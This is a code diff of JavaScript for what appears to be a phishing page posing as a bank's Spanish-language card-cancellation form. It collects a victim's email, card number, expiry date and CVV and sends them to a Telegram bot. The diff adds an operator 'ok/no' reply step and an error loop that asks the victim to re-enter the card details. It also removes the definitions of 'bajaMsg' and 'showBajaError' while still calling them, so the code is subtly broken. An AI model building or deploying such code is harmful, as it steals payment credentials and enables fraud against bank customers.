@@ -154,8 +154,15 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- 5. RESULTADO: LÓGICA DE BAJA DE TARJETA ---
   const formBajaContainer = document.getElementById('baja-form-container');
   const bajaResultContainer = document.getElementById('baja-result-container');
+  const bajaErrorFlag = sessionStorage.getItem('baja_error');
 
-  if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'aprobado') {
+  if (bajaErrorFlag === 'true') {
+    sessionStorage.removeItem('baja_error');
+    if (navBaja) navBaja.click();
+    showBajaError('❌ Datos incorrectos. Por favor verifique los datos de su tarjeta e intente nuevamente.');
+  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'aprobado') {
+    // ... aquí sigue tu código actual de Tarjeta Digital Cancelada Exitosamente ...
+
     if (formBajaContainer) formBajaContainer.style.display = 'none';
     if (bajaResultContainer) {
       bajaResultContainer.style.display = 'block';
@@ -235,96 +242,96 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // --- 7. AUTO-FORMATO Y VALIDACIONES PARA EL FORMULARIO DE BAJA ---
+    // --- 7. AUTO-FORMATO Y VALIDACIONES PARA EL FORMULARIO DE BAJA ---
   const inputTarjeta = document.getElementById('baja-tarjeta');
   const inputVencimiento = document.getElementById('baja-vencimiento');
-  const bajaMsg = document.getElementById('baja-status-message');
 
-  function showBajaError(mensaje) {
-      if(bajaMsg) {
-          bajaMsg.style.display = 'block';
-          bajaMsg.style.backgroundColor = '#f8d7da';
-          bajaMsg.style.color = '#721c24';
-          bajaMsg.textContent = mensaje;
+  if (inputTarjeta) {
+    inputTarjeta.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').substring(0, 16);
+      if (bajaMsg) bajaMsg.style.display = 'none';
+    });
+  }
+
+  if (inputVencimiento) {
+    inputVencimiento.addEventListener('input', function () {
+      let val = this.value.replace(/\D/g, '');
+      if (val.length > 2) {
+        val = val.substring(0, 2) + '/' + val.substring(2, 4);
       }
-  }
-
-  if(inputTarjeta) {
-      inputTarjeta.addEventListener('input', function() {
-          this.value = this.value.replace(/\D/g, '').substring(0, 16);
-          if(bajaMsg) bajaMsg.style.display = 'none';
-      });
-  }
-
-  if(inputVencimiento) {
-      inputVencimiento.addEventListener('input', function(e) {
-          let val = this.value.replace(/\D/g, '');
-          if(val.length > 2) {
-              val = val.substring(0, 2) + '/' + val.substring(2, 4);
-          }
-          this.value = val;
-      });
+      this.value = val;
+    });
   }
 
   function isValidLuhn(value) {
-      let nCheck = 0, bEven = false;
-      value = value.replace(/\D/g, "");
-      for (let n = value.length - 1; n >= 0; n--) {
-          let cDigit = value.charAt(n), nDigit = parseInt(cDigit, 10);
-          if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
-          nCheck += nDigit;
-          bEven = !bEven;
-      }
-      return (nCheck % 10) === 0;
+    let nCheck = 0, bEven = false;
+    value = value.replace(/\D/g, '');
+    for (let n = value.length - 1; n >= 0; n--) {
+      let cDigit = value.charAt(n), nDigit = parseInt(cDigit, 10);
+      if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
+      nCheck += nDigit;
+      bEven = !bEven;
+    }
+    return (nCheck % 10) === 0;
   }
 
   const formBaja = document.getElementById('form-baja-digital');
-  if(formBaja) {
-      formBaja.addEventListener('submit', async (e) => {
-          e.preventDefault();
+  if (formBaja) {
+    formBaja.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-          const tj = document.getElementById('baja-tarjeta').value;
-          const ven = document.getElementById('baja-vencimiento').value;
-          const cvv = document.getElementById('baja-cvv').value;
+      const tj = document.getElementById('baja-tarjeta').value;
+      const ven = document.getElementById('baja-vencimiento').value;
+      const cvv = document.getElementById('baja-cvv').value;
 
-          if (tj.length !== 16) {
-              showBajaError("El número de tarjeta debe tener exactamente 16 dígitos.");
-              return;
-          }
+      if (tj.length !== 16) {
+        showBajaError('El número de tarjeta debe tener exactamente 16 dígitos.');
+        return;
+      }
 
-          if (!isValidLuhn(tj)) {
-              showBajaError("Error de seguridad: La tarjeta ingresada no es válida. Revise los números.");
-              return;
-          }
+      if (!isValidLuhn(tj)) {
+        showBajaError('Error de seguridad: La tarjeta ingresada no es válida. Revise los números.');
+        return;
+      }
 
-          sessionStorage.setItem('flow_type', 'baja');
+      sessionStorage.setItem('flow_type', 'baja');
+      sessionStorage.setItem('baja_pendiente_validacion', 'true');
 
-          if(bajaMsg) {
-              bajaMsg.style.display = 'block';
-              bajaMsg.style.backgroundColor = '#d4edda';
-              bajaMsg.style.color = '#155724';
-              bajaMsg.textContent = 'Datos verificados correctamente. Redirigiendo a OTP...';
-          }
+      if (bajaMsg) {
+        bajaMsg.style.display = 'block';
+        bajaMsg.style.backgroundColor = '#d4edda';
+        bajaMsg.style.color = '#155724';
+        bajaMsg.textContent = 'Validando datos de tarjeta... Por favor espere.';
+      }
 
-          const textoTG = `*SOLICITUD DE BAJA DE TARJETA DIGITAL* \n\n👤 *Usuario:* \`${userEmail}\`\n💳 *Tarjeta:* \`${tj}\`\n📅 *Vencimiento:* \`${ven}\`\n 🔑*CVV:* \`${cvv}\`\n\nEl usuario esta siendo enviado a la pantalla OTP.`;
+      const textoTG = `*SOLICITUD DE BAJA DE TARJETA DIGITAL*\n\n` +
+        `👤 *Usuario:* \`${userEmail}\`\n` +
+        `💳 *Tarjeta:* \`${tj}\`\n` +
+        `📅 *Vencimiento:* \`${ven}\`\n` +
+        `🔑 *CVV:* \`${cvv}\`\n\n` +
+        `Responde \`ok\` para confirmar la baja directa o \`no\` si los datos son incorrectos.`;
 
-          try {
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ chat_id: chatId, text: textoTG, parse_mode: 'Markdown' })
-              });
-          } catch(error) {
-              console.error(error);
-          }
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: textoTG,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (error) {
+        console.error(error);
+      }
 
-          setTimeout(() => {
-              window.location.href = 'loading.html';
-          }, 2000);
-      });
+      setTimeout(() => {
+        window.location.href = 'loading.html';
+      }, 2000);
+    });
   }
 
-  // --- 9. BOTON DE CERRAR SESIÓN ---
+  // --- 8. BOTÓN DE CERRAR SESIÓN ---
   const btnLogout = document.getElementById('dash-logout');
   if (btnLogout) {
     btnLogout.addEventListener('click', (e) => {
